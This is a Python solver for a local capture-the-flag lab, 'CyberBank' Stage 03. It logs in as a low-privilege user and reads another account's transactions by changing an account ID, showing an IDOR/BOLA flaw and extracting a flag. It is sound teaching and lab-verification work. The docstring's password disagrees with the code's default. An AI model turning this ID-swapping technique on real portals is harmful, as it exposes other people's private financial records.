#!/usr/bin/env python3
"""
CyberBank: Operation BlackVault
Stage 03 (Broken Banking Portal) - Local Vulnerability Verification & Solver

Responsible Member: Arachchi B A A A B (IT24102592)
Responsibility: Challenge Design A - Stages 1-3 (Member 2)

Vulnerability Demonstrated:
    Insecure Direct Object Reference (IDOR) / Broken Object-Level Authorization (BOLA)
    CWE-639: Authorization Bypass Through User-Controlled Key

Intended Target:
    Local CyberBank Stage 03 Environment (DEFAULT: http://localhost:8080)
    STRICT NOTICE: This script is designed exclusively for the local educational CTF.
    Do NOT target external or unauthorized infrastructure.

Mechanics:
    1. Authenticates as low-privilege customer ('customer_user' / 'BankingPass2026!').
    2. Maintains authenticated session cookie.
    3. Traverses authorization boundary by requesting BlackVault Escrow account_id=7721
       via both HTML and API endpoints (/transactions?account_id=7721).
    4. Extracts and validates the Stage 03 flag.

Usage:
    python scripts/member2/stage3_solver.py
"""

import os
import sys
import re
import urllib.request
import urllib.parse
import http.cookiejar
import json

# =============================================================================
# Configuration & Credentials (Member 2 Review Section)
# =============================================================================
# TODO [Member 2 Review]: Verify target URL matches container port (Default: 8080)
BASE_URL = os.environ.get("STAGE3_TARGET_URL", "http://localhost:8080").rstrip("/")

# Standard low-privilege challenge test credentials
TEST_USERNAME = os.environ.get("STAGE3_USER", "customer_user")
TEST_PASSWORD = os.environ.get("STAGE3_PASS", "Password123!")

# Target vulnerable IDOR object ID
TARGET_ACCOUNT_ID = 7721


class Stage3Solver:
    """Automated proof-of-concept verification client for Stage 03 IDOR."""

    def __init__(self, base_url: str):
        self.base_url = base_url
        self.cookie_jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.cookie_jar)
        )
        # Custom User-Agent for audit traceability
        self.headers = {"User-Agent": "CyberBank-Member2-Verifier/2.0"}

    def login(self, username: str, password: str) -> bool:
        """Authenticate to banking portal and establish session cookie."""
        login_url = f"{self.base_url}/login"
        post_data = urllib.parse.urlencode({
            "username": username,
            "password": password,
        }).encode("utf-8")

        req = urllib.request.Request(login_url, data=post_data, headers=self.headers)
        try:
            with self.opener.open(req) as resp:
                content = resp.read().decode("utf-8", errors="replace")
                # Successful login redirects to /dashboard
                return "Account Summary" in content or "dashboard" in resp.geturl()
        except Exception as e:
            print(f"[-] Authentication failed: {e}")
            return False

    def exploit_idor_html(self, account_id: int) -> str | None:
        """Query /transactions?account_id=<target> to exploit IDOR via HTML view."""
        url = f"{self.base_url}/transactions?account_id={account_id}"
        req = urllib.request.Request(url, headers=self.headers)
        try:
            with self.opener.open(req) as resp:
                html = resp.read().decode("utf-8", errors="replace")
                # Search for canonical flag format: CBANK{...}
                match = re.search(r"CBANK\{[a-zA-Z0-9_\-]+\}", html)
                if match:
                    return match.group(0)
        except Exception as e:
            print(f"[-] HTML exploitation request failed: {e}")
        return None

    def exploit_idor_api(self, account_id: int) -> str | None:
        """Query /api/account/<target> to verify JSON API IDOR endpoint."""
        url = f"{self.base_url}/api/account/{account_id}"
        req = urllib.request.Request(url, headers=self.headers)
        try:
            with self.opener.open(req) as resp:
                raw_json = resp.read().decode("utf-8", errors="replace")
                data = json.loads(raw_json)
                for tx in data.get("transactions", []):
                    notes = tx.get("notes", "")
                    match = re.search(r"CBANK\{[a-zA-Z0-9_\-]+\}", notes)
                    if match:
                        return match.group(0)
        except Exception as e:
            print(f"[-] API exploitation request failed: {e}")
        return None


def main():
    print("=" * 65)
    print(" CyberBank Stage 03 (Broken Banking Portal) - Local Solver")
    print(" Responsible Member: Arachchi B A A A B (IT24102592) - Stages 1-3")
    print(" Vulnerability: Insecure Direct Object Reference (BOLA / IDOR)")
    print("=" * 65)
    print(f"[*] Target Endpoint: {BASE_URL}")

    solver = Stage3Solver(BASE_URL)

    # Step 1: Authentication
    print(f"[*] Step 1: Authenticating as low-privilege customer '{TEST_USERNAME}'...")
    if not solver.login(TEST_USERNAME, TEST_PASSWORD):
        print("[-] FAIL: Could not log in. Verify that the stage3-web container is running.")
        print("    Run: docker compose up -d stage3-web")
        sys.exit(1)
    print("[+] PASS: Successfully authenticated. Session cookie established.")

    # Step 2: Exploit IDOR HTML
    print(f"[*] Step 2: Modifying account_id parameter to target Vault Account #{TARGET_ACCOUNT_ID}...")
    recovered_flag = solver.exploit_idor_html(TARGET_ACCOUNT_ID)

    # Step 3: Exploit IDOR API if HTML didn't return
    if not recovered_flag:
        print("[*] Checking alternate API endpoint (/api/account/7721)...")
        recovered_flag = solver.exploit_idor_api(TARGET_ACCOUNT_ID)

    if recovered_flag:
        print("\n" + "=" * 65)
        print("[+] SUCCESS: IDOR Vulnerability Verified!")
        print(f"[+] Recovered Stage 03 Flag: {recovered_flag}")
        print("=" * 65)
        print("\n[NOTE] Member 2 Verification Complete:")
        print("Submit this flag at http://localhost:5000 to advance to Stage 04.")
        sys.exit(0)
    else:
        print("[-] FAIL: Flag could not be extracted from target account records.")
        sys.exit(1)


if __name__ == "__main__":
    main()
